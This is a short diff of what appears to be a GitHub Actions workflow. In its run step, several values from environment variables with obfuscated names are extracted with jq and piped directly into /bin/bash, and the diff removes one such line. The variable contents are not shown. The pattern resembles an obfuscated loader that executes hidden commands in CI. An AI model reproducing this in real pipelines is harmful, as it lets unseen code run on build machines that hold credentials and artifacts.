@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$gay2" | jq -r .nnlv1005 | /bin/bash
           printf '%s' "$cb0493" | jq -r .gwe079 | /bin/bash
           printf '%s' "$m9" | jq -r .y25393 | /bin/bash
-          printf '%s' "$brmew9" | jq -r .le11187 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
